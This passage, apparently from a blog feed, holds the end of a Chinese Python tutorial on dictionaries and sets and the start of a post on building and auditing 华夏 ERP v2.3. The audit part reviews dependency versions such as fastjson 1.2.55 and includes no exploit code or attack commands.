title="5.字典的相关操作方法"></a>5.字典的相关操作方法</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171106049.png" alt="image-20251024161201492"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171108196.png" alt="image-20251024161207523"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-17字典的相关操作方法</span></span><span class="line"><span style="color: #abb2bf">d={1001:&#39;李梅&#39;,1002:&#39;王华&#39;,1003:&#39;张峰&#39;}</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf">#　向字典中添加元素</span></span><span class="line"><span style="color: #abb2bf">d[1004]=&#39;张丽丽&#39; # 直接使用赋值运算符向字典中添加元素</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf"># 获取字典中所有的key</span></span><span class="line"><span style="color: #abb2bf">keys=d.keys()</span></span><span class="line"><span style="color: #abb2bf">print(keys) # dict_keys([1001, 1002, 1003, 1004])</span></span><span class="line"><span style="color: #abb2bf">print(list(keys))</span></span><span class="line"><span style="color: #abb2bf">print(tuple(keys))</span></span><span class="line"><span style="color: #abb2bf"># 获取字典中所有的value</span></span><span class="line"><span style="color: #abb2bf">values=d.values()</span></span><span class="line"><span style="color: #abb2bf">print(values) # dict_values([&#39;李梅&#39;, &#39;王华&#39;, &#39;张峰&#39;, &#39;张丽丽&#39;])</span></span><span class="line"><span style="color: #abb2bf">print(list(values))</span></span><span class="line"><span style="color: #abb2bf">print(tuple(values))</span></span><span class="line"><span style="color: #abb2bf">#　如果将字典中的数据转成key-value的形式，以元组的方式进行展现</span></span><span class="line"><span style="color: #abb2bf">lst=list(d.items())</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf">d=dict(lst)</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf">#　使用pop函数</span></span><span class="line"><span style="color: #abb2bf">print(d.pop(1001))</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf">print(d.pop(1008,&#39;不存在&#39;))</span></span><span class="line"><span style="color: #abb2bf"># 随机删除</span></span><span class="line"><span style="color: #abb2bf">print(d.popitem())</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf">#　清空字典中所有的元素</span></span><span class="line"><span style="color: #abb2bf">d.clear()</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf"># Python中一切皆对象，每个对象都有一个布尔值</span></span><span class="line"><span style="color: #abb2bf">print(bool(d)) # False</span></span></code></pre></div></div></figure><h3 id="6-字典生成式"><a href="#6-字典生成式" class="headerlink" title="6.字典生成式"></a>6.字典生成式</h3><p>d&#x3D;{key:value for item in range}</p><p> d&#x3D;{key:value for key,value in zip(lst1,lst2)}</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-18字典生成式</span></span><span class="line"><span style="color: #abb2bf">import random</span></span><span class="line"><span style="color: #abb2bf">d={item :random.randint(1,100) for item in range(4)}</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf"># 创建两个列表</span></span><span class="line"><span style="color: #abb2bf">lst=[1001,1002,1003]</span></span><span class="line"><span style="color: #abb2bf">lst2=[&#39;陈梅梅&#39;,&#39;王一一&#39;,&#39;李丽丽&#39;]</span></span><span class="line"><span style="color: #abb2bf">d={key:value for key,value in zip(lst,lst2)}</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span></code></pre></div></div></figure><h2 id="6-集合类型"><a href="#6-集合类型" class="headerlink" title="6.集合类型"></a>6.集合类型</h2><h3 id="1-集合定义"><a href="#1-集合定义" class="headerlink" title="1.集合定义"></a>1.集合定义</h3><p>Python中的集合与数学中集合的概念一致</p><p> Python中的集合是一个无序的不重复元素序列 </p><p>集合中只能存储不可变数据类型 </p><p>在Python中集合使用{}定义 </p><p>与列表、字典一样，都是Python中的可变数据类型</p><h3 id="2-集合的创建方式有两种"><a href="#2-集合的创建方式有两种" class="headerlink" title="2.集合的创建方式有两种"></a>2.集合的创建方式有两种</h3><h4 id="1-使用-直接创建集合-语法结构如下："><a href="#1-使用-直接创建集合-语法结构如下：" class="headerlink" title="(1)使用{}直接创建集合  语法结构如下："></a>(1)使用{}直接创建集合  语法结构如下：</h4><p> s&#x3D;{element1,element2,……elementN} </p><h4 id="2-使用内置函数set-创建集合-语法结构如下："><a href="#2-使用内置函数set-创建集合-语法结构如下：" class="headerlink" title="(2)使用内置函数set()创建集合  语法结构如下："></a>(2)使用内置函数set()创建集合  语法结构如下：</h4><p> s&#x3D;set(可迭代对象)</p><h3 id="3-集合的删除"><a href="#3-集合的删除" class="headerlink" title="3.集合的删除"></a>3.集合的删除</h3><p>语法结构如下： </p><p>del 集合名</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-19集合的创建与删除</span></span><span class="line"><span style="color: #abb2bf"># {}直接创建集合</span></span><span class="line"><span style="color: #abb2bf">s = {10, 20, 30, 40}</span></span><span class="line"><span style="color: #abb2bf">print(s)</span></span><span class="line"><span style="color: #abb2bf"># 集合只能存储不可变数据类型</span></span><span class="line"><span style="color: #abb2bf"># s={[10,20],[30,40]} # TypeError: unhashable type: &#39;list&#39;</span></span><span class="line"><span style="color: #abb2bf"># print(s)</span></span><span class="line"><span style="color: #abb2bf"># 使用set()创建集合</span></span><span class="line"><span style="color: #abb2bf">s = set()  # 创建了一个空集合，空集合的布尔值是False</span></span><span class="line"><span style="color: #abb2bf">print(s)</span></span><span class="line"><span style="color: #abb2bf">s = {}  # 创建的是集合还是字典呢？</span></span><span class="line"><span style="color: #abb2bf">print(s,type(s)) # &lt;class &#39;dict&#39;&gt;</span></span><span class="line"><span style="color: #abb2bf">s=set(&#39;helloworld&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(s)</span></span><span class="line"><span style="color: #abb2bf">s2=set([10,20,30])</span></span><span class="line"><span style="color: #abb2bf">print(s2)</span></span><span class="line"><span style="color: #abb2bf">s3=set(range(1,10))</span></span><span class="line"><span style="color: #abb2bf">print(s3)</span></span><span class="line"><span style="color: #abb2bf"># 集合属于序列的一种</span></span><span class="line"><span style="color: #abb2bf">print(&#39;max:&#39;,max(s3))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;min:&#39;,min(s3))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;len:&#39;,len(s3))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;9在集合中存在吗？&#39;,(9 in s3))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;9在集合中不存在吗？&#39;,(9 not in s3))</span></span><span class="line"><span style="color: #abb2bf">#　集合的删除操作</span></span><span class="line"><span style="color: #abb2bf">del s3</span></span><span class="line"><span style="color: #abb2bf"># print(s3) # NameError: name &#39;s3&#39; is not defined</span></span></code></pre></div></div></figure><h3 id="4-集合类型的操作符"><a href="#4-集合类型的操作符" class="headerlink" title="4.集合类型的操作符"></a>4.集合类型的操作符</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171112942.png" alt="image-20251024161406403"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">#　示例5-20集合的操作符</span></span><span class="line"><span style="color: #abb2bf">A={10,20,30,40,50}</span></span><span class="line"><span style="color: #abb2bf">B={30,50,88,76,20}</span></span><span class="line"><span style="color: #abb2bf"># 交集操作</span></span><span class="line"><span style="color: #abb2bf">print(A&amp;B)</span></span><span class="line"><span style="color: #abb2bf"># 并集操作</span></span><span class="line"><span style="color: #abb2bf">print(A|B)</span></span><span class="line"><span style="color: #abb2bf"># 差集操作</span></span><span class="line"><span style="color: #abb2bf">print(A-B)</span></span><span class="line"><span style="color: #abb2bf">print(B-A)</span></span><span class="line"><span style="color: #abb2bf"># 补集操作</span></span><span class="line"><span style="color: #abb2bf">print(A^B)</span></span></code></pre></div></div></figure><h3 id="5-集合的相关操作方法"><a href="#5-集合的相关操作方法" class="headerlink" title="5.集合的相关操作方法"></a>5.集合的相关操作方法</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171150704.png" alt="image-20251024161431308"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-21集合的相关操作</span></span><span class="line"><span style="color: #abb2bf">s={10,20,30}</span></span><span class="line"><span style="color: #abb2bf"># 向集合中添加元素</span></span><span class="line"><span style="color: #abb2bf">s.add(100)</span></span><span class="line"><span style="color: #abb2bf">print(s)</span></span><span class="line"><span style="color: #abb2bf"># 删除元素</span></span><span class="line"><span style="color: #abb2bf">s.remove(20)</span></span><span class="line"><span style="color: #abb2bf">print(s)</span></span><span class="line"><span style="color: #abb2bf"># 清除集合中所有元素</span></span><span class="line"><span style="color: #abb2bf"># s.clear()</span></span><span class="line"><span style="color: #abb2bf"># print(s)</span></span><span class="line"><span style="color: #abb2bf"># 集合的遍历操作</span></span><span class="line"><span style="color: #abb2bf">for item in s:</span></span><span class="line"><span style="color: #abb2bf">    print(item)</span></span><span class="line"><span style="color: #abb2bf"># 使用enumerate()函数</span></span><span class="line"><span style="color: #abb2bf">for index,item in enumerate(s):</span></span><span class="line"><span style="color: #abb2bf">    print(index,&#39;--&gt;&#39;,item)</span></span><span class="line"><span style="color: #abb2bf"># 集合的生成式</span></span><span class="line"><span style="color: #abb2bf">s={i for i in range(1,10) if i%2==1}</span></span><span class="line"><span style="color: #abb2bf">print(s)</span></span></code></pre></div></div></figure><h3 id="6-列表、元组、字典、集合的区别"><a href="#6-列表、元组、字典、集合的区别" class="headerlink" title="6.列表、元组、字典、集合的区别"></a>6.列表、元组、字典、集合的区别</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171116092.png" alt="image-20251024161457181"></p><h3 id="7-P-y-t-h-o-n-3-1-1-新-特-性"><a href="#7-P-y-t-h-o-n-3-1-1-新-特-性" class="headerlink" title="7 . P y t h o n 3 . 1 1 新 特 性"></a>7 . P y t h o n 3 . 1 1 新 特 性</h3><h4 id="1-结-构-模-式-匹-配"><a href="#1-结-构-模-式-匹-配" class="headerlink" title="1 . 结 构 模 式 匹 配"></a>1 . 结 构 模 式 匹 配</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171118170.png" alt="image-20251024161532421"></p><h4 id="2-字典合并-运-算-符"><a href="#2-字典合并-运-算-符" class="headerlink" title="2.字典合并 运 算 符|"></a>2.字典合并 运 算 符|</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171129754.png" alt="image-20251024161618826"></p><h4 id="3-同-步-迭-代"><a href="#3-同-步-迭-代" class="headerlink" title="3 . 同 步 迭 代"></a>3 . 同 步 迭 代</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171131197.png" alt="image-20251024161636130"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171134941.png" alt="image-20251024161643204"></p><h2 id="8-本章总结"><a href="#8-本章总结" class="headerlink" title="8.本章总结"></a>8.本章总结</h2><ul><li>序列结构主要有列表、元组、集合、字典和字符串 </li><li>正向递增索引取值范围[0,N-1]，反向递减索引取值范围[-1,-N] </li><li>切片操作语法结构：序列名 [start ： end : step] </li><li>创建列表的方式：(1)使用[]直接创建 (2)使用内置函数list()创建 </li><li>列表的相关操作方法： <ul><li>添加方法：append()和insert()</li><li>删除方法：clear()、remove()、pop() </li><li>列表元素的排序：sort()和内置函数sorted() </li><li>其它方法：reverse()和copy()</li></ul></li><li>创建元组的方式：（1）使用()直接创建（2）使用内置函数tuple()创建 </li><li>创建字典的方式：（1）使用{}直接创建（2）使用内置函数dict() </li><li>使用内置函数dict()创建字典的两种方式： <ul><li>通过映射函数zip(lst1,Ist2)创建字典 </li><li>通过给定关键字创建字典dict(key1&#x3D;value1,key2&#x3D;value2……)</li></ul></li><li>字典的相关操作方法： <ul><li>查询方法:get()、keys()、values()和items()</li><li>删除方法:pop()、popitem()和clear()</li></ul></li><li>创建集合的方式：（1）使用{}直接创建（2）使用内置函数set()创建 </li><li>集合的相关操作方法： <ul><li>添加方法：add </li><li>删除方法：remove()和clear()</li></ul></li><li>列表、字典、集合都是Python中的可变数据类型，元组是Python中的不可变数据类型 </li><li>列表、元组、字典和集合的遍历都可以通过for循环实现 </li><li>列表、元组、字典和集合的删除都可以使用语句del来实现</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华夏-ERPv2.3搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/%E5%8D%8E%E5%A4%8F-ERPv2.3%E6%90%AD%E5%BB%BA&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/%E5%8D%8E%E5%A4%8F-ERPv2.3%E6%90%AD%E5%BB%BA&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="华夏-ERPv2-3搭建"><a href="#华夏-ERPv2-3搭建" class="headerlink" title="华夏-ERPv2.3搭建"></a>华夏-ERPv2.3搭建</h1><p><strong>JDK</strong>：推荐 <code>JDK 1.8</code> 或 <code>11</code>（jkd1.8&#x3D;&#x3D;jdk8）</p><p><strong>Maven</strong>：3.6+</p><p><strong>Node.js + npm</strong>：前端构建需要，推荐 Node.js <code>14.x/16.x</code></p><p><strong>数据库</strong>：MySQL 5.7 或 8.0（推荐 5.7）</p><p><strong>IDE</strong>：IntelliJ IDEA </p><h2 id="使用IDEA"><a href="#使用IDEA" class="headerlink" title="使用IDEA"></a>使用IDEA</h2><ol><li><p>下载：下载地址（v2.3版本）：<a href="https://github.com/jishenghua/jshERP/releases">https://github.com/jishenghua/jshERP/releases</a> </p></li><li><p>导入到IDEA（记得配置java环境为1.8）（可以自己下载，也可以使用IDEA自带的）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164920568.png" alt="image-20250822213808211"></p></li><li><p>配置数据库（可以先使用phpstudy创建数据库，导入文件<code>jsh_erp.sql</code>，再使用Navicat Premium 17连接数据库）</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164909999.png"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910003.png" alt="image-20250822213200088"></p><ol start="4"><li><p>使用 IDEA 打开项目，执行 <code>mvn clean install</code>，然后运行 <code>JshErpApplication.java</code> 主类即可启动。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164938988.png" alt="image-20250822213723216"></p><ul><li><p><strong>Maven</strong> 的命令，用来：</p><ul><li><code>clean</code>：清理掉之前编译的文件</li><li><code>install</code>：编译 + 打包项目，并把 jar&#x2F;war 包安装到本地 Maven 仓库</li></ul><p>先clean ，再install</p></li><li><p>JshErpApplication.java启动</p><ul><li><p>目录结构</p><figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">jshERP-boot</span></span><span class="line"><span style="color: #C678DD"> └─ src</span></span><span class="line"><span style="color: #C678DD">     └─ </span><span style="color: #E06C75">main</span></span><span class="line"><span style="color: #C678DD">         └─ java</span></span><span class="line"><span style="color: #C678DD">             └─ com</span></span><span class="line"><span style="color: #C678DD">                 └─ jsh</span></span><span class="line"><span style="color: #C678DD">                     └─ erp</span></span><span class="line"><span style="color: #C678DD">                         └─ JshErpApplication</span><span style="color: #D19A66">.java</span><span style="color: #C678DD">   ← 启动类</span></span></code></pre></div></div></figure></li><li><p>路径</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">jshERP-boot/src/main/java/com/jsh/erp/JshErpApplication.java</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910006.png" alt="image-20250822213601489"></p></li></ul></li></ul></li><li><p>出现</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910011.png" alt="image-20250822213625370"></p><p>说明启动成功（显示url，账号密码就可以自行测试啦）</p></li></ol><h1 id="华夏-ERPv2-3审计"><a href="#华夏-ERPv2-3审计" class="headerlink" title="华夏-ERPv2.3审计"></a>华夏-ERPv2.3审计</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>华夏ERP-2.3 是一款面向中小企业的开源 ERP 系统，基于 <strong>SpringBoot + MyBatis</strong> 构建，前端采用 jQuery、EasyUI 和 AdminLTE。系统功能涵盖多个模块，能够满足中小企业日常经营管理需求。</p><p>该版本特点是 <strong>开源、免费、易部署</strong>，支持多用户权限控制，适合学习、二次开发和中小企业信息化使用。但由于 v2.3 版本依赖库较旧，存在一定的 <strong>安全漏洞</strong>（如 SQL 注入、Fastjson 反序列化、XSS 等），实际部署时需注意升级和安全加固。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>先大致浏览下整个项目的大致结构和配置信息</p><p><strong>pom.xml</strong>：</p><p>该文件用于管理：源代码、配置文件、开发者的信息和角色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等等。</p><ol><li><p>使用了1.2.55 版本的fastjson，具备fastjson 反序列化的版本要求</p><p>（1.2.55～1.2.68以下存在FastJson <strong>绕过导致反序列化漏洞</strong>）</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;com.alibaba&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;fastjson&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;1.2.55&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>了2.10.0 版本的log4j（emmmmm  但是这个版本是不存在漏洞的）</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.apache.logging.log4j&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;log4j-to-slf4j&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;2.10.0&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">scope</span><span style="color: #ABB2BF">&gt;compile&lt;/</span><span style="color: #E06C75">scope</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>数据库使用了MyBatis</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;com.gitee.starblues&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;springboot-plugin-framework-extension-mybatis&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;2.2.1-RELEASE&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li></ol><p><strong>filter 配置</strong>：</p><p>里面存放的应该是项目对应的拦截器过滤器</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.jsh.erp.filter</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.util.StringUtils</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.*</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebFilter</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebInitParam</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletRequest</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletResponse</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.ArrayList</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.List</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.regex.Matcher</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.regex.Pattern</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebFilter</span><span style="color: #E06C75">(</span><span style="color: #D19A66">filterName</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;LogCostFilter&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">urlPatterns</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> {</span><span style="color: #98C379">&quot;/*&quot;</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #D19A66">initParams</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> {</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebInitParam</span><span style="color: #E06C75">(</span><span style="color: #D19A66">name</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span 